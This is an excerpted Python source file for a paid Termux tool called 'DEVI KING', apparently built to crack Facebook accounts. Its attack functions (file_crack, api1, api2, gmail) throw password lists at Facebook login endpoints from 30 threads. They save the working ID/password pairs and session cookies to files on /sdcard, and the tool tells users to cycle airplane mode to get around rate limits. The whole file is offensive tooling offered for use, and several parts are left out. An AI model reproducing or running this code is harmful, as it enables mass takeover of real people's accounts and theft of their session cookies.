...
try:
	...
	time.sleep(0.5)
	print('Join Our Teligerm Group')
	os.system('xdg-open https://www.facebook.com/devifyter')
	os.system('xdg-open https://www.facebook.com/devifyter')
except ModuleNotFoundError:
	os.system('clear')
#_____Logo manu ____
def meyexudi():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')			
sim_id = ''
...
--------------------------------------------------
 \033[1;37m[+] PRODUCT: DEVI KING
 [+] Facebook : https://www.facebook.com/devifyter
 [+] Tool : PAID
 [+] Version: 9.7
\x1b[1;92m--------------------------------------------------""")
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/deathherev/Cloning-Fb/blob/main/Approval.txt').text
    if id in httpCaht:
     # print(fuckyoursali)
     # print(hedaborakarent)
      ...
      #print(meyermarexudi)
      print("\033[32;1m[\033[1;37m+\033[1;32m] Your Kay : "+id)
     ...
     # print(" \x1b[0m║══[=]> YOUR KEY : "+id)
      ...
      #os.system('xdg-open https://t.me/@h4xyxl') 
      
      tks = ('Hello%20Devi%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923263342276?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def Main_Menu():
		...
		linex()
		YXL= input('\033[1;37m [+] Select option: ')
		if YXL =='1':
			file_crack()
		elif YXL =='2':
			r_crack()
			...
			print('\033[1;37m [+] SELECT AN OPTION..\033[1;37m ')
			time.sleep(0.5)
			Main_Menu()
...
def file_crack():
	...
	try:
		...
		print('\033[1;37m SAHI LOCATION DO RANDIW KA BACHW');Main_Menu()
	clear()
	print(' [1] Method 1 ')
	print(' [2] Method 2 ')
	linex()
	...
	with tred(max_workers=30) as YXL:
		...
		print('\33[1;37m WAIT EVERY 30 MIN \033[1;97m')
		print('\033[1;37m USE AIR PLANE MODE AFTER 40 SECONDS')
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if mthd in ['1','01']:
				YXL.submit(api1,ids,names,passlist)
			elif mthd in ['2','02']:
				YXL.submit(api2,ids,names,passlist)
			else:
				Main_Menu()
	print('\033[1;37m')
	linex()
...
def gmail():
	...
	clear()
	print('\033[1;37m Example: \033[1;32m YXL, Ali, Ahmed, Hamza\033[1;97m')
	linex()
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in po:
				...
				if 'LIVE' in get_req:
					print('\r\r\033[1;32m [DEVI-OK] ' + uid + ' | ' + pas)
					print(' \33[1;33m[Cookies🍪] : ' + cookie)
					open('/sdcard/YXL/YXL-Mail-OK.txt', 'a').write(uid + '|' + pas + '\n')
					open('/sdcard/YXL/YXL-Mail-OK-COOKIE.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
					oks.append(uid)
					break
				if 'DEAD' in get_req:
				...
				print('\r\033[1;91m [DEVI-CP] ' + uid + ' | ' + pas + '\033[1;97m')
				file_path = os.path.join(folder_path, 'DEVI-CP.txt')
		...
		for pas in passlist:
			...
			if 'session_key' in po:
					...
					if 'LIVE' in get_req:
						print('\r\r\033[1;32m [DEVI-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies🍪] : '+cookie)
						open('/sdcard/YXL/YXL-RANDOM-OK.txt','a').write(uid+'|'+pas+'\n')
						open('/sdcard/YXL/YXL-RANDOM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
					if 'DEAD' in get_req:
						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[DEVI-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={ssbb};{ckkk}"
					print('\r\r\033[1;32m [YXL-OK] '+uid+' ✓ '+pas)
					print(' \33[1;33m[lund 🍪] ✓ '+cookie)
					open('/sdcard/YXL/YXL-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
					open('/sdcard/YXL/YXL-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
...
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[DEVI-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					cookie = f"sb={ssbb};{ckkk}"
					print('\r\r\033[1;32m [DEVI-OK] '+uid+' ✓ '+pas)
					print(' \33[1;33m[PUDHI 🍪] ✓ '+cookie)
					open('/sdcard/DEVI/DEVI-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
					open('/sdcard/DEVI/DEVI-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					#print('\r\033[1;91m [DEVI-CP] '+uid+' × '+pas+'\033[1;97m')
					open('/sdcard/DEVI/DEVI-CP.txt','a').write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
...
def r_crack1():
	...
	if crk =='3':
		...
		print('\033[1;37m LOCATION OF GENERATING');time.sleep(1.5);Main_Menu()
...
def pak():
	...
	with tred(max_workers=30) as YXL:
		...
		print('\33[1;37m [+] DONT FORGET TO FOLLOW MY FACEBOOK \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			ak=ids[:7]
